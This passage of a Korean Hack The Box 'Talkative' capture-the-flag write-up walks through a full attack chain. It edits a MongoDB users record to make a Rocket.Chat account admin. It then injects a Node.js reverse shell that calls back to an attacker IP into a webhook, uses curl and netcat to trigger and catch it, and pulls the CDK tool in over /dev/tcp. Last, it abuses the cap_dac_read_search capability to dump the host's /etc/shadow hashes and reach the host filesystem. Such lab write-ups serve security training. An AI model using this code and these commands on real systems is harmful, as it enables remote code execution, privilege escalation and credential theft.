이 중에서 가장 중요하다고 판단되는 `users` 테이블을 분석하였다:

```bash
rs0:PRIMARY> db.users.find().pretty()

{
        "_id" : "rocket.cat",
        "createdAt" : ISODate("2021-08-10T19:44:00.224Z"),
        "avatarOrigin" : "local",
        "name" : "Rocket.Cat",
        "username" : "rocket.cat",
        "status" : "online",
        "statusDefault" : "online",
        "utcOffset" : 0,
        "active" : true,
        "type" : "bot",
        "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"),
        "roles" : [
                "bot"
        ]
}
{
        "_id" : "ZLMid6a4h5YEosPQi",
        "createdAt" : ISODate("2021-08-10T19:49:48.673Z"),
        "services" : {
                "password" : {
                        "bcrypt" : "$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y"
                },
                "email" : {
                        "verificationTokens" : [
                                {
                                        "token" : "dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w",
                                        "address" : "saul@talkative.htb",
                                        "when" : ISODate("2021-08-10T19:49:48.738Z")
                                }
                        ]
                },
                "resume" : {
                        "loginTokens" : [
                                {
                                        "when" : ISODate("2022-03-15T17:06:53.808Z"),
                                        "hashedToken" : "VMehhXEh1Z89e3nwMIq+2f5JIFid/7vo6Xb6bXh2Alc="
                                }
                        ]
                }
        },
        "emails" : [
                {
                        "address" : "saul@talkative.htb",
                        "verified" : false
                }
        ],
        "type" : "user",
        "status" : "offline",
        "active" : true,
        "_updatedAt" : ISODate("2022-04-04T17:12:30.788Z"),
        "roles" : [
                "admin"
        ],
        "name" : "Saul Goodman",
        "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"),
        "statusConnection" : "offline",
        "username" : "admin",
        "utcOffset" : 0
}
{
        "_id" : "Ei99ne8ZRaqS7pAds",
        "createdAt" : ISODate("2025-11-06T10:49:55.574Z"),
        "services" : {
                "password" : {
                        "bcrypt" : "$2b$10$QAz/wOF2bxgf2SvaqdrD1eEiTx7E6JHaK.L2vxql9kmd657.2TNG.",
                        "reset" : {
                                "token" : "Gf1Fru3kYlNNFJ_SVztPLamf7ZKH87QrWCRm_JpOpUm",
                                "email" : "jisang@talkative.htb",
                                "when" : ISODate("2025-11-06T10:49:58.469Z"),
                                "reason" : "enroll"
                        }
                },
                "email" : {
                        "verificationTokens" : [
                                {
                                        "token" : "uRC5hMpYxb13tnAAIRBQ4A4F1-4VRkZLTyw5aTLSZkL",
                                        "address" : "jisang@talkative.htb",
                                        "when" : ISODate("2025-11-06T10:49:55.602Z")
                                }
                        ]
                },
                "resume" : {
                        "loginTokens" : [
                                {
                                        "when" : ISODate("2025-11-06T10:49:55.895Z"),
                                        "hashedToken" : "OthX6blhr7w6FuH6TTqK+FaLu8ifvlgQUo2vfD1RdaI="
                                }
                        ]
                }
        },
        "emails" : [
                {
                        "address" : "jisang@talkative.htb",
                        "verified" : false
                }
        ],
        "type" : "user",
        "status" : "online",
        "active" : true,
        "_updatedAt" : ISODate("2025-11-06T10:49:58.478Z"),
        "roles" : [
                "user"
        ],
        "name" : "jisang",
        "lastLogin" : ISODate("2025-11-06T10:49:55.892Z"),
        "statusConnection" : "online",
        "utcOffset" : -5,
        "username" : "jisang"
}
```

해당 테이블에는 Rocket.Chat 시스템의 사용자 정보가 저장되어 있었으며,

관리자 권한을 가진 계정(`admin` 역할의 `saul@talkative.htb`)과 Rocket.Chat 에서 직접 생성한 일반 사용자 계정(`user` 역할의 `jisang@talkative.htb`)이 확인되었다.

이후 `"roles"` 필드를 수정하여 일반 사용자 계정의 권한을 `admin` 으로 변경하였다:

```bash
rs0:PRIMARY> db.users.updateOne({"_id":"Ei99ne8ZRaqS7pAds"},{$set:{"roles":["admin"]}})

{ "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }
```

명령어 실행 후, 다시 `users` 테이블을 확인한 결과 `jisang@talkative.htb` 계정의 `"roles"` 값이 `"admin"` 으로 성공적으로 변경된 것을 확인할 수 있었다:

```bash
rs0:PRIMARY> db.users.find().pretty()

# ...[SKIP]...
{
        "_id" : "Ei99ne8ZRaqS7pAds",
        "createdAt" : ISODate("2025-11-06T10:49:55.574Z"),
        "services" : {
                "password" : {
                        "bcrypt" : "$2b$10$QAz/wOF2bxgf2SvaqdrD1eEiTx7E6JHaK.L2vxql9kmd657.2TNG.",
                        "reset" : {
                                "token" : "Gf1Fru3kYlNNFJ_SVztPLamf7ZKH87QrWCRm_JpOpUm",
                                "email" : "jisang@talkative.htb",
                                "when" : ISODate("2025-11-06T10:49:58.469Z"),
                                "reason" : "enroll"
                        }
                },
                "email" : {
                        "verificationTokens" : [
                                {
                                        "token" : "uRC5hMpYxb13tnAAIRBQ4A4F1-4VRkZLTyw5aTLSZkL",
                                        "address" : "jisang@talkative.htb",
                                        "when" : ISODate("2025-11-06T10:49:55.602Z")
                                }
                        ]
                },
                "resume" : {
                        "loginTokens" : [
                                {
                                        "when" : ISODate("2025-11-06T10:49:55.895Z"),
                                        "hashedToken" : "OthX6blhr7w6FuH6TTqK+FaLu8ifvlgQUo2vfD1RdaI="
                                }
                        ]
                }
        },
        "emails" : [
                {
                        "address" : "jisang@talkative.htb",
                        "verified" : false
                }
        ],
        "type" : "user",
        "status" : "away",
        "active" : true,
        "_updatedAt" : ISODate("2025-11-06T10:55:57.211Z"),
        "roles" : [
                "admin"
        ],
        "name" : "jisang",
        "lastLogin" : ISODate("2025-11-06T10:49:55.892Z"),
        "statusConnection" : "away",
        "utcOffset" : -5,
        "username" : "jisang"
}
```

이후 다시 Rocket.Chat 웹 인터페이스에 접속하여 로그인을 진행한 결과, 상단 메뉴에 `Administration` 항목이 새롭게 나타난 것을 확인할 수 있었다.

![ADMIN 권한 상승](/assets/htb-linux/talkative/rocket-chat-admin.png)

## Reverse Shell via WebHook

`Administration` 항목을 클릭하면 다양한 관리 기능을 확인할 수 있다.

![Menu](/assets/htb-linux/talkative/webhook-menu.png)

이 중, 빨간색으로 표시된 `Integrations` 메뉴를 통해 WebHook 기능에 접근할 수 있다.

**New Integration → Incoming WebHook** 항목으로 들어가면, 이름(Name), 채널(Post to Channel), 게시 사용자(Post as) 등을 입력할 수 있는 설정 화면이 나타난다.

![설정 화면](/assets/htb-linux/talkative/webhook-new.png)

아래로 조금 더 내려가면 스크립트를 작성할 수 있는 입력란이 나타난다.

이곳에서 리버스 셸을 실행할 수 있는 스크립트를 JSON 형식으로 삽입하면, WebHook 을 통해 원격 명령 실행이 가능해진다.

![셸 삽입 경로 Find](/assets/htb-linux/talkative/webhook-script.png)

스크립트란에 간단한 리버스 셸 코드를 삽입하였다:

```js
const require = console.log.constructor('return process.mainModule.require')();
var net = require('net'), sh = require('child_process').exec('/bin/bash');
var client = new net.Socket();
client.connect(9003, '10.10.14.171', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```

스크립트를 삽입한 이후 `Save changes` 버튼을 클릭하면, 하단에 `WebHook URL` 이 자동으로 생성된 것을 확인할 수 있다:

![WebHook URL](/assets/htb-linux/talkative/webhook-url.png)

해당 **WebHook URL은 curl 요청을 통해 실행** 시킬 수 있으며, 삽입한 스크립트 또한 이 트리거에 의해 실행되는 구조다.

먼저 로컬 터미널에서 `nc` 명령어를 통해 리버스 셸을 받을 준비를 한다:

```bash
$ nc -lvnp 9003
```

그런 다음, 아래와 같이 `curl` 명령으로 WebHook을 트리거 시켰다:

```bash
$ curl http://talkative.htb:3000/hooks/Nq3xhpxSzugoz6TWS/sX5k......

{"success":false}
```

`{"success":false}` 라는 응답이 뜨긴 하지만, 실제로 `nc`를 통해 확인해보면 정상적으로 연결이 이루어지며 리버스 셸 획득에 성공했다.

![리버스 셸 획득](/assets/htb-linux/talkative/webhook-revshell.png)

## Docker Container → root Lateral Movement

도커 컨테이너 내에서 `/proc/self/status` 파일을 확인해본 결과, 이상적으로 높은 권한이 부여되어 있는 것을 확인할 수 있었다.

```bash
root@c150397ccd63:/proc/self# cat status

# ...[SKIP]...
Threads:        1
SigQ:   1/7484
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000010000
SigIgn: 0000000000380004
SigCgt: 000000004b817efb
CapInh: 0000000000000000
CapPrm: 00000000a80425fd
CapEff: 00000000a80425fd
CapBnd: 00000000a80425fd
CapAmb: 0000000000000000
NoNewPrivs:     0
Seccomp:        2
Speculation_Store_Bypass:       vulnerable
Cpus_allowed:   00000000,00000000,00000000,00000003
Cpus_allowed_list:      0-1
Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:      0
voluntary_ctxt_switches:        16
nonvoluntary_ctxt_switches:     28
```

이 **CapEff 필드**를 기반으로 `capsh` 를 이용해 디코딩한 결과는 다음과 같다:

```bash
$ capsh --decode=00000000a80425fd

0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

위와 같이 **파일 시스템, 네트워크, 사용자 및 그룹 전환 등과 관련된 주요 권한(`capability`)들이 다수 활성화된 상태**임을 알 수 있다. 이는 컨테이너 환경 내에서 루트 권한 획득이 가능한 매우 강력한 권한 상태라는 것을 의미한다.

`/proc/self/status` 파일에서 도커 컨테이너가 높은 권한을 가진 것을 확인한 후, [CDK](https://github.com/cdk-team/CDK) 도구를 활용하였다.

CDK 실행 파일을 다운로드 받은 후, 내 로컬 터미널에서 리버스 방향으로 전송 대기를 한 후:

```bash
$ nc -lvnp 9004 < cdk_linux_amd64
```

도커 컨테이너 내부에서 Bash의 TCP 소켓 기능을 사용하여 파일을 로컬로부터 수신하였다:

```bash
root@c150397ccd63:~# cat < /dev/tcp/10.10.14.171/9004 > cdk_linux_amd64
```

이후 실행 권한을 부여해주었다:

```bash
root@c150397ccd63:~# chmod +x cdk_linux_amd64
```

이후 CDK 도구를 활용하여 `cap-dac-read-search` 모듈을 실행시키면, **컨테이너 내부에서 호스트 시스템의 민감한 파일인 `/etc/shadow` 에 접근**할 수 있다:

```bash
root@c150397ccd63:~# ./cdk_linux_amd64 run cap-dac-read-search
./cdk_linux_amd64 run cap-dac-read-search
Running with target: /etc/shadow, ref: /etc/hostname
root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
# ...[SKIP]...
usbmux:*:18849:0:99999:7:::
sshd:*:18849:0:99999:7:::
systemd-coredump:!!:18849::::::
lxd:!:18849::::::
saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::
```

이처럼, 컨테이너를 탈출하지 않고도 **호스트 시스템의 `/etc/shadow` 파일을 읽어 root 및 사용자 계정의 해시 정보를 덤프할 수 있게 된다.**

만약 `cap-dac-read-search` 모듈을 통해 루트(`/`) 경로 전체에 접근하도록 지정하게 되면 다음과 같은 결과를 얻을 수 있다:

```bash
root@c150397ccd63:~# ./cdk_linux_amd64 run cap-dac-read-search /etc/hosts /
Running with target: /, ref: /etc/hosts
executing command(/bin/bash)...

root@c150397ccd63:/# ls
ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  var
boot  dev    home  lib32  libx32  media 
```

`id` 명령어 상의 UID는 여전히 컨테이너의 root로 보일 수 있지만, **파일 시스템은 호스트의 루트(`/`)로 마운트된 상태**가 된다.

즉, 이 권한 상승을 통해 **호스트 머신의 실제 루트 파일 시스템에 접근**할 수 있으며, 이로 인해 최종적으로 **플래그 파일까지 획득**하였다.

![플래그 획득](/assets/htb-linux/talkative/flag.png)